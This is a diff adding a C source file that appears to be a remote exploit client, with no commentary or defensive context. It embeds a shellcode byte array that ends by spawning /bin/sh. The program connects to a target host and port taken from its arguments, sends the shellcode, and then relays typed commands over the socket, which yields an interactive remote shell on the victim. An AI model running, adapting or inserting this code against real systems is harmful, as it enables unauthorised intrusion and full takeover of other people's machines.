@@ -1,0 +1,76 @@
+#include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+char shellcode[] = {
+"\x68\xff\x30\x01\x40\x5b\xc1\xeb\x08\x48\x8b\x0b\x48\x03\x4b\x10"
+"\x48\x8b\x59\x28\x48\xff\xcb\x81\x3b\x7f\x45\x4c\x46\x75\xf5\xeb"
+"\x03\x59\xeb\x6a\xe8\xf8\xff\xff\xff\x55\x55\x52\x48\x31\xd2\x57"
+"\x50\x53\x56\x55\x5f\x53\x5d\x6a\x4c\x58\x48\x03\x1c\x83\x48\x83"
+"\xc3\x10\x80\x3b\x05\x75\xf7\x48\x8b\x43\x08\x48\x8b\x5b\x18\x48"
+"\x83\xc3\x18\x52\x5e\x66\x33\x33\x48\x01\xc6\x50\x52\x52\x58\xfc"
+"\xac\xc1\xc2\x0c\x01\xc2\x84\xc0\x75\xf6\x52\x5e\x5a\x58\x39\xf7"
+"\x75\xdd\x48\x03\x6c\x93\x08\x48\x89\x6c\x24\x30\x5e\x5b\x58\x5f"
+"\x5a\x5d\xc3\x68\x80\x47\x6c\x69\x5d\x48\x31\xff\xff\xd1\xbd\xf7"
+"\x01\xcc\xf8\x6a\x02\x5f\x48\x8d\x54\x24\xec\xc6\x02\x10\x48\x8d"
+"\x72\x04\x66\xff\xc7\x74\xdc\x48\x8d\x62\x14\x48\x83\xec\x20\x51"
+"\xff\xd1\x59\x84\xc0\x75\xeb\x6a\x1b\x41\x58\xb8\x80\xff\xff\xfe"
+"\xf7\xd0\x42\x39\x04\x84\x75\xda\x41\xb0\x35\x66\xb8\xfb\x2d\xf7"
+"\xd0\x66\x42\x39\x04\x44\x75\xca\x68\x50\x27\x67\x70\x5d\x48\x31"
+"\xd2\x52\x52\x5e\x51\xff\xd1\x59\xff\xc6\x83\xfe\x04\x75\xf5\xbd"
+"\x37\xbb\x6b\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62"
+"\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\xff\xd1"
+};
+
+void error(char *err) {
+  perror(err);
+  exit(0);
+}
+
+int main(int argc, char *argv[]) {
+  struct sockaddr_in server_addr, bind_addr;
+  struct hostent* server, *_bind;
+  char buf[1024], inbuf[1024];
+  int sock;
+
+  _bind = gethostbyname(argv[3]);
+  bind_addr.sin_family = AF_INET;
+  bind_addr.sin_port   = htons(atoi(argv[4]));
+  memcpy(&bind_addr.sin_addr.s_addr, _bind->h_addr, _bind->h_length);
+
+  server = gethostbyname(argv[1]);
+  server_addr.sin_family = AF_INET;
+  memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
+  server_addr.sin_port = htons(atoi(argv[2]));
+
+  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    error(" [!] socket()");
+
+  if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
+    error(" [!] bind()");
+
+  printf(" [*] Connecting to %s\n", argv[1]);
+  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
+    error(" [*] connect()");
+
+  printf(" [*] Sending payload\n");
+  if (send(sock, shellcode, strlen(shellcode), MSG_NOSIGNAL) < 0)
+    error(" [!] write()");
+
+  while(fgets(buf, 1024, stdin) != NULL) {
+    if (send(sock, buf, strlen(buf), MSG_NOSIGNAL) < 0)
+      error(" [!] write(): ");
+    if (recv(sock, inbuf, 1024, 0) < 0)
+      error(" [!] read(): ");
+    printf("%s", inbuf);
+    memset(inbuf, 0, 1024);
+    memset(buf, 0, 1024);
+  }
+
+  return 0;
+}
